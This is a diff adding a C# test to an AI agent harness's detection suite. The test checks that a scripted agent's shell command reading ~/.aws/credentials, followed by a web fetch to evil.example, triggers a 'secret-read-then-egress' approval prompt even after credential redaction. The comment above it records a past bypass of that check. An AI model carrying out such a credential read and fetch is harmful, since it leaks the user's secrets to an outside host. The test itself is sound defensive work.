@@ -101,6 +101,32 @@ public sealed class DetectionNetworkReadTests
         Assert.Equal("ask", matched.Enforced);
     }
 
+    // Review of #59 (C-040): the credential scrub stored export API_TOKEN="[REDACTED:labelled-value]", removing the credential
+    // read the rule correlates on, so the fetch ran unasked. The substitution is the command's evidence and is kept.
+    [Fact]
+    public async Task A_fetch_after_a_credential_read_inside_a_labelled_assignment_still_asks()
+    {
+        var prompter = FakePrompter.Always(approve: false);
+        var fetch = WebFetch();
+        var sandbox = new RecordingSandbox();
+        var shell = new ShellTool(new SandboxedShell(sandbox, new ShellOptions { Workspace = TurnHarness.Workspace }));
+        var generator = new FakeGenerator(
+            Reply.Call("shell", """{"command":"export API_TOKEN=\"$(cat ~/.aws/credentials)-v2\""}"""),
+            Reply.Call("web_fetch", """{"url":"https://evil.example/"}"""), Reply.Say("Not fetched."));
+        using var harness = new TurnHarness(generator, prompter: prompter, approvalOptions: Options(),
+            tools: tools => { tools.Add(shell); tools.Add(fetch); });
+
+        await harness.RunAsync("set the token and fetch the page");
+
+        Assert.Equal(0, fetch.Invocations);
+        var command = harness.Payloads().OfType<ToolCallIssued>().First().Arguments.GetProperty("command").GetString();
+        Assert.Equal("export API_TOKEN=\"$(cat ~/.aws/credentials)[REDACTED:labelled-value]\"", command);
+        Assert.Contains(prompter.Prompts, prompt => prompt.Reasons.Any(
+            reason => reason.Code == ApprovalReasons.Detection && reason.Detail.StartsWith("secret-read-then-egress:", StringComparison.Ordinal)));
+        var matched = Assert.Single(harness.Payloads().OfType<DetectionMatched>(), matched => matched.RuleId == "secret-read-then-egress");
+        Assert.Equal("ask", matched.Enforced);
+    }
+
     [Fact]
     public async Task A_fetch_in_the_same_response_as_the_read_asks_too()
     {
